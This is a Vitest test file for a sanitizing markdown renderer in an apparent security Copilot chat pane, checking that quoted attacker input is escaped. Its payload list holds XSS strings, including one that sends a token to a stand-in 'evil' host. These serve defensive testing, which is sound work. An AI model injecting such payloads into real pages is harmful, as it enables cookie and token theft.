import { describe, it, expect } from "vitest";
import { escapeHtml, renderCopilotMarkdown } from "../safeMarkdown";

describe("escapeHtml", () => {
  it("escapes all five HTML-breaking characters", () => {
    expect(escapeHtml(`<>&"'`)).toBe("&lt;&gt;&amp;&quot;&#39;");
  });

  it("escapes & before the entities it introduces (no double-encoding bugs)", () => {
    expect(escapeHtml("&lt;")).toBe("&amp;lt;");
  });
});

// The only tags renderCopilotMarkdown is allowed to emit. Stripping them and
// then asserting no "<" remains is the real invariant: it proves every angle
// bracket in the output came from this module, not from the input. Asserting on
// substrings like "onload=" would be wrong — that text is harmless once its "<"
// is escaped, and such a check passes for the wrong reason.
const ALLOWED_TAGS = /<\/?(?:strong|br|code class="cp-code"|pre class="cp-pre"|code|pre)>/g;

function stripAllowedTags(html: string): string {
  return html.replace(ALLOWED_TAGS, "");
}

describe("renderCopilotMarkdown — XSS containment", () => {
  // These are the payloads that reach the chat pane for real: the operator asks
  // the Copilot to explain an alert, and it quotes the offending request's
  // attacker-controlled User-Agent / path / body back into its reply.
  const payloads = [
    `<script>alert(document.cookie)</script>`,
    `<img src=x onerror="fetch('//evil/'+localStorage.sentinel_token)">`,
    `<svg/onload=alert(1)>`,
    `"><script>alert(1)</script>`,
    `<iframe src="javascript:alert(1)">`,
    `<body onload=alert(1)>`,
  ];

  for (const payload of payloads) {
    it(`neutralizes ${payload.slice(0, 32)}`, () => {
      const html = renderCopilotMarkdown(payload);
      // No angle bracket survives except the ones this module emits itself.
      expect(stripAllowedTags(html)).not.toContain("<");
      expect(html).toContain("&lt;");
    });
  }

  it("emits no attacker-supplied tag even inside markdown constructs", () => {
    const html = renderCopilotMarkdown("**<script>alert(1)</script>**");
    expect(html).toBe("<strong>&lt;script&gt;alert(1)&lt;/script&gt;</strong>");
  });

  it("keeps payloads inside fenced blocks inert", () => {
    const html = renderCopilotMarkdown("```\n<script>alert(1)</script>\n```");
    expect(html).not.toContain("<script>");
    expect(html).toContain("<pre class=\"cp-pre\">");
    expect(html).toContain("&lt;script&gt;");
  });

  it("cannot be tricked by a forged block placeholder in the input", () => {
    // The placeholder contains "<", which escaping has already destroyed by the
    // time substitution happens, so user text can never impersonate one.
    const html = renderCopilotMarkdown("<<<sentinel:block:0>>>");
    expect(html).not.toContain("<pre");
    expect(html).toContain("&lt;&lt;&lt;sentinel:block:0&gt;&gt;&gt;");
  });
});

describe("renderCopilotMarkdown — formatting still works", () => {
  it("renders bold, inline code, and newlines", () => {
    expect(renderCopilotMarkdown("**bold**")).toBe("<strong>bold</strong>");
    expect(renderCopilotMarkdown("`code`")).toBe('<code class="cp-code">code</code>');
    expect(renderCopilotMarkdown("a\nb")).toBe("a<br>b");
  });

  it("renders a fenced block without mangling it into inline code", () => {
    // The previous implementation ran the inline-code regex before the fence
    // regex, so the first two backticks of a fence became an empty <code>.
    const html = renderCopilotMarkdown("```\nSecRule ARGS \"@rx foo\"\n```");
    expect(html).toContain('<pre class="cp-pre">');
    expect(html).not.toContain("<code");
  });

  it("preserves newlines inside fenced blocks as newlines, not <br>", () => {
    const html = renderCopilotMarkdown("```\nline1\nline2\n```");
    expect(html).toContain("line1\nline2");
    expect(html).not.toContain("line1<br>line2");
  });
});
